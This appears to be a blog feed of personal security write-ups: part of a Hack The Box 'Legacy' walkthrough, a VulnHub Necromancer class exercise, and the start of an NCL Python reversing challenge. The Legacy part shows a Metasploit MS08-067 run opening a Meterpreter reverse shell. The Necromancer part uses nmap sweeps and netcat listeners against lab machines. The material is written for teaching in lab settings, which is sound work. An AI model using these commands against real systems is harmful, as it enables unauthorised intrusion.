&lt;p&gt;So in theory a Metasploit module can &lt;strong&gt;do the work for us, get us in&lt;/strong&gt;, and not only that but already &lt;strong&gt;be admin level&lt;/strong&gt;. Note taken!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploit-db.com&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/7132&quot;&gt;Exploit-db link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/Walkthroughs/Legacy/EDB-7132.png&quot; alt=&quot;EDB-7132&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay so this is literally the exploit for this particular vulnerability published online. Great. From the site we can tell that&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Is Verified by EDB to work.&lt;/li&gt;
  &lt;li&gt;Written in python&lt;/li&gt;
  &lt;li&gt;Has some python dependencies&lt;/li&gt;
  &lt;li&gt;Takes arguments based on which OS you’re targeting, i.e. has multiple payloads&lt;/li&gt;
  &lt;li&gt;Sets up a listener on port 4444&lt;/li&gt;
  &lt;li&gt;exploit portion of the script is shellcode for a portbind that came from Metasploit.&lt;/li&gt;
  &lt;li&gt;Was listed ‘7132.py’ in our searchsploit results.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If our enumeration has been correct so far, this is almost a stopping point. We know the OS, SMB version, the CVE, and the exploit. And everything lines up really well. Not a lot of chances for failure here. But always keep reading before firing something off, your little copy and paste pew pew could really wreck a machine if you’re not careful.&lt;/p&gt;

&lt;h4 id=&quot;cve-2017-0143&quot;&gt;CVE-2017-0143&lt;/h4&gt;
&lt;p&gt;Okay so before we dig into this. Think back to 2017 and try to remember some sort of massive worldwide scare involving SMB… do you remember? Yeahhhhhh. WannaCry? This bad boy right here is also known as MS17-010. I imagine this machine could be broken into using either of these CVEs but I chased the above method. But for reference, here are some links.&lt;/p&gt;

&lt;p&gt;https://www.exploit-db.com/exploits/41891&lt;br /&gt;
https://www.cvedetails.com/cve/CVE-2017-0143/&lt;/p&gt;

&lt;h4 id=&quot;exploitation-and-gaining-access&quot;&gt;Exploitation and Gaining Access&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Trying out CVE-2008-4250 aka MS08-067&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So this exploit has two methods, Metasploit and of course finding the exploit online. Or I mean… if you’re a big shot, maybe develop your own exploit.&lt;/p&gt;

&lt;h4 id=&quot;manual-exploit&quot;&gt;Manual Exploit&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;Adding this section soon&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;metasploit&quot;&gt;Metasploit&lt;/h4&gt;
&lt;p&gt;After I saw that Metasploit was an option here, I quickly fired a Metasploit missile at this silly boy. You can use the search function in Metasploit to find a module called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit/windows/smb/ms08_067_netapi&lt;/code&gt;. It was super easy to run. Note that sometimes exploits revolving around MS08-067 and MS17-010 can be finicky. You might have to try it a couple times. Here is what it looked like in Metasploit.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Search for the exploit&lt;/li&gt;
  &lt;li&gt;use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use&lt;/code&gt; command and the name of the exploit&lt;/li&gt;
  &lt;li&gt;check the options with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;set necessary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;options&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name
--  ----
0   Automatic Targeting

msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; rhosts 10.10.10.4
[-] Unknown command: rhosts.
msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; set rhosts 10.10.10.4
rhosts =&amp;gt; 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) &amp;gt; run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -&amp;gt; 10.10.10.4:1031) at 2020-05-11 23:01:23 -0400

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Boom you’ve got a meterpreter shell and if you check, you’re big boy admin with all the rights in the world. Yes this hack was pretty easy, yes it’s based off of a massive vulnerability that hit the news which means every IT guy and gal across the globe knows about it and hopefully that means they are all patched up. But. That is wishful thinking. I have to say the biggest value in this is that is was a really rewarding hack. It was my first HTB and for a lot of folks reading this, it’s probably theirs as well. Or… it should be I would say. There is massive value in doing easy boxes like this for your confidence. It gives so much momentum that tackling harder boxes are just a little bit less scary. SO. That’s it. I hope this helps. If I said something stupid or lied or anything else, feel free to reach out.&lt;br /&gt;
 Twitter - &lt;a href=&quot;https://twitter.com/mehhsecurity&quot;&gt;@mehhsecurity&lt;/a&gt;&lt;br /&gt;
 Email is &lt;strong&gt;hi.imzackjones@gmail.com&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Cheers, 
Zack.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">The Legacy HTB machine was one of the first HTB machines I ever broke into. It’s a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It’s a good start for practicing for the OSCP.</summary></entry><entry><title type="html">Necromancer VulnHub Class Exercise</title><link href="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html" rel="alternate" type="text/html" title="Necromancer VulnHub Class Exercise" /><published>2019-02-02T08:16:00-05:00</published><updated>2019-02-02T08:16:00-05:00</updated><id>http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2019/02/02/Necromancer-VulnHub-Writeup.html">&lt;h2 id=&quot;necromancer-notes&quot;&gt;Necromancer Notes&lt;/h2&gt;
&lt;h5 id=&quot;made-for-intro-for-cyber-security-class-taught-spring-2019&quot;&gt;Made for Intro for Cyber Security Class taught Spring 2019.&lt;/h5&gt;

&lt;p&gt;Necromancer is a CTF that can be downloaded and ran on a virtual environment such as VirtualBox, VMWare, Hyper-V.  &lt;a href=&quot;https://www.vulnhub.com/entry/the-necromancer-1,154/&quot;&gt;https://www.vulnhub.com/entry/the-necromancer-1,154/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To assist with our walk through of this CTF, we will be using this reference video - &lt;a href=&quot;https://www.youtube.com/watch?v=ULRZcsjkvSA&quot;&gt;JackkTutorials - Necromancer&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The video does not complete the CTF but we will follow through the steps to complete as much as he completes in the video. Try to follow along with his steps.&lt;/p&gt;

&lt;p&gt;Following the hacking methodology as discussed, you will want to start with some recon.&lt;/p&gt;

&lt;h3 id=&quot;passive-recon&quot;&gt;Passive Recon&lt;/h3&gt;
&lt;p&gt;Jackk looks at the website for clues, looks at the virtual machine’s screen for information. Also gathers information about his machine and the network. Finds all IP addresses on the network in order to find the machine. Eliminates other machines one by one.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Website information&lt;/strong&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/Website-Recon.png&quot; alt=&quot;Website Recon&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Machine DHCP&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/Machine_DHCP_Screen.png&quot; alt=&quot;Machine DHCP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;To eliminate the IP addresses&lt;/strong&gt;&lt;br /&gt;
He uses route to find gateway, looks in log files to find DHCP, looks in ifconfig for himself. Last IP is the machine.&lt;/p&gt;

&lt;h4 id=&quot;commands-used&quot;&gt;Commands used&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig  //checking Linux interface information. Similar to Windows ipconfig
route -n  //checking what your machine's gateway. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Using Route to find the gateway&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/route.png&quot; alt=&quot;route&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Using ifconfig to find your own IP&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&quot;/assets/img/Walkthroughs/Necromancer/ifconfig.png&quot; alt=&quot;ifconfig&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;active-recon&quot;&gt;Active Recon&lt;/h3&gt;
&lt;p&gt;First &lt;code&gt;nmap&lt;/code&gt; the network to get an idea of what machines are on the network and help find the machine you’re looking to hack. Then nmap scan on the IP address of the victim machine. Look for ports that could be vulnerable.&lt;/p&gt;

&lt;h4 id=&quot;scanning-whole-network-for-all-machines-that-are-up&quot;&gt;Scanning whole network for all machines that are up&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sP 192.168.1.*
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Note the use of a wildcard in the IP to cover all possible addresses in the 192.168.1 network.&lt;br /&gt;
The -sP scan means just pinging machines. Note: Some machines may not respond to ICMP packets depending on how the machine is setup.&lt;/p&gt;

&lt;h4 id=&quot;scanning-a-single-machine-for-tcp-ports-that-are-open-simple&quot;&gt;Scanning a single machine for tcp ports that are open (simple)&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap 192.168.1.22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ports that are vulnerable are things like http, https, ftp, telnet, smb, and plenty others. Other ports are important as well. Getting an idea of what the machine is running is key to understanding what you are working with.&lt;/p&gt;

&lt;p&gt;He fails to find a port that is open using a typical TCP nmap scan. He decided to run another scan, but tells nmap to check for UDP instead of TCP. With UDP you want to limit the ports.&lt;/p&gt;

&lt;h4 id=&quot;udp-nmap-scan&quot;&gt;UDP nmap Scan&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sU 1-1000 192.168.1.22   //does a udp scan on ports 1 through 1000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;udp-port-found&quot;&gt;UDP Port found.&lt;/h4&gt;
&lt;p&gt;Scans find a port open. He finds a UDP port that is open called doom on port 666.&lt;/p&gt;

&lt;p&gt;To connect to a computer you must have a socket. And to have a socket all you need is the IP address and an open port that is willing to communicate.&lt;/p&gt;

&lt;p&gt;With UDP sometimes you can just simply connect to it with a tool called netcat. From there you will see the raw data being transferred. If it’s encrypted you will not be able to read it. To try and connect to this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -u 192.168.110.22 666
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It successfully connects to the port and the necromancer machine then sends plaintext data to him that says &lt;code&gt;Time is running out. You gasp for air!&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;To see if anything else is happening on the machine while the UDP port is connected. You can open wireshark and let it run for a bit to find that the Necromancer machine actually attempts to connect to his machine on TCP port 4444. Note: The TCP port seems to only want to connect once you’ve connected to the UDP port.&lt;/p&gt;

&lt;p&gt;You can also listen for connections the same way we did before for TCP connections. But in this case it’s listening for any machine on the port. The command looks like this.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 4444  /// listens for any incoming connections on port 4444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It connects successfully and it spits out a string of random characters. This was encoded and needed to be decoded.&lt;/p&gt;

&lt;p&gt;The decoded message left a clue that said &lt;code&gt;Chant the string of flag1 -u666&lt;/code&gt; it also gives him the first flag which is jumbled letters and numbers.&lt;/p&gt;

&lt;p&gt;When you find jumbled letters and numbers, it may be good practice to test to see if it is encoded or encrypted and possibly useful information.&lt;/p&gt;

&lt;h3 id=&quot;to-check-a-string-for-encoding-or-hashingencryption&quot;&gt;To check a string for encoding or hashing/encryption&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashid [the string you are testing]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Hashid is a tool that checks for signatures or clues of certain hashes. it isn’t always accurate but it can help when you’re not sure.&lt;/p&gt;

&lt;p&gt;HashID shows that the string is an MD5 hash and he uses an online MD5 hash decrypt tool. The flag decrypted ends up being &lt;code&gt;opensesame&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now he connects to UDP port 666 while sending &lt;code&gt;opensesame&lt;/code&gt; to the other machine using echo.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo opensesame | nc -u 192.168.100.140 666
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;By using echo and piping it into the netcat connection, we send it the string &lt;code&gt;opensesame&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Once he makes this new connection it gives him another clue along with a second flag. This clue lets him know that 666 is closed and “A formation that looks like 80”&lt;/p&gt;

&lt;p&gt;Port 80 is generally used for HTTP. HTTPS, which is encrypted is usually on 443. If a computer has port 80 open, you can go to it’s ip address on your machine to look at whatever webpage(s) it is hosting.&lt;/p&gt;

&lt;p&gt;He nmap scans the machine again to make sure port 80 is open.&lt;/p&gt;

&lt;p&gt;He goes to the website.&lt;/p&gt;

&lt;p&gt;The first thing he does to recon the site is to look at the source code to see if there are more clues or to see if it is wordpress, etc.&lt;/p&gt;

&lt;p&gt;He notices that the only thing on the page that may have something worth looking into is the picture so he checks the picture for stenography.&lt;/p&gt;

&lt;p&gt;Stego isn’t typically used in the real world, but is a good skill to understand and know how to work with as a Cyber Security professional.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unzip pileoffeathers.jpg   //attempt to unzip a file to find other files within it. Files can be hidden inside of other files. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once he unzips the picture, a pileoffeathers.txt is then pulled from the image and saved onto his machine.&lt;/p&gt;

&lt;p&gt;The text file has another Base64 hash inside of it. It decodes to give another flag and a clue to his next step “/amagicbridgeappearsatthechasm” and the flag decodes to a number.&lt;/p&gt;

&lt;p&gt;He visits the directory from the hidden file to find another page.&lt;/p&gt;

&lt;h4 id=&quot;video-ends-here&quot;&gt;Video ends here.&lt;/h4&gt;

&lt;p&gt;We can assume that the &lt;code&gt;/amagicbridgeappearsatthechasm&lt;/code&gt; is possibly a directory. Try going to the site by typing the host’s IP address and then going to the url. From there use your Web pentesting notes to search through possible directories, check pages that are hidden from Google’s web crawlers, test to see if it’s running off of Wordpress, etc. Take screenshots of your findings.&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">Necromancer Notes Made for Intro for Cyber Security Class taught Spring 2019.</summary></entry><entry><title type="html">NCL Gym Exploitation ‘Python 2’</title><link href="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html" rel="alternate" type="text/html" title="NCL Gym Exploitation ‘Python 2’" /><published>2018-04-02T21:13:00-04:00</published><updated>2018-04-02T21:13:00-04:00</updated><id>http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2</id><content type="html" xml:base="http://hiimzackjones.github.io/infosec/2018/04/02/NCL-Gym-Exploitation-PYTHON2.html">&lt;p&gt;So this challenge at first glance was intimidating. There was a bit more going on in this one. But always, always, always - code looks scarier than it actually is. But before we get into the code. The download was a .pyc file.&lt;/p&gt;

&lt;p&gt;Wut.&lt;/p&gt;

&lt;p&gt;I’ve made a few python scripts before and I’ve never seen pyc. Google time.&lt;/p&gt;

&lt;p&gt;Oh. Well. This is usually where I stop. I usually skip compiled stuff, and a pyc is a compiled python program.&lt;/p&gt;

&lt;p&gt;Luckily there are tools to undo the ugly compiled mess. I’m on a Mac so I used brew to install uncompyle6. Again I googled for a bit.&lt;/p&gt;

&lt;p&gt;uncompyle6 is simple. Put in a pyc and out comes code.&lt;/p&gt;

&lt;p&gt;This is what my terminal spits out&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uncompyle6 PYTHON2.pyc
# uncompyle6 version 3.1.1
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Jul 15 2017, 17:16:57)
# [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)]
# Embedded file name: NCL-2015-Python2.py
# Compiled at: 2015-11-12 17:43:01
import sys

def main():
    if len(sys.argv) != 2:
        print 'Invalid args'
        return
    password = sys.argv[1]
    counter = 0
    vals = list('tfzbwlyzljylawhzzdvyk')
    if len(password) != len(vals):
        print 'incorrect'
        return
    while counter &amp;lt; len(password):
        x = ord(password[counter]) + 7
        if x &amp;gt; ord('z'):
            x -= 26
        if chr(x) != vals[counter]:
            print 'incorrect'
            return
        counter += 1

    print 'correct'


if __name__ == '__main__':
    main()
# okay decompiling PYTHON2.pyc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ugh. I should have put that into a file or something. Run it again but do it better!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ uncompyle6 PYTHON2.pyc &amp;gt; thisisthecode.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Head over to sublime text and browse on over to find this beautiful python code that I can actually work with.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Invalid args'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tfzbwlyzljylawhzzdvyk'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'incorrect'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'z'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'incorrect'&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'correct'&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay okay. Let’s try to figure this sucker out. Diving in section by section.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-pyhton&quot;&gt;vals = list('tfzbwlyzljylawhzzdvyk')
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;turns tfzbwlyzljylawhzzdvyk into a list of each letter. so vals[2], the third item in the vals list is z. For example:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;if your password isn’t the length of the vals list then no go.&lt;/p&gt;

&lt;p&gt;Checking the length of val&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;len('tfzbwlyzljylawhzzdvyk')
&amp;gt;&amp;gt;&amp;gt;21
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So the password is 21 characters.&lt;/p&gt;

&lt;p&gt;If you’ve got that far then it runs a while loop.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Starting at the first position, do stuff until we get to the end. Okay simple. So far we are just setting up the parameters of the length of the password and telling the code to check each character until we get to the end. Nothing really important yet.&lt;/p&gt;

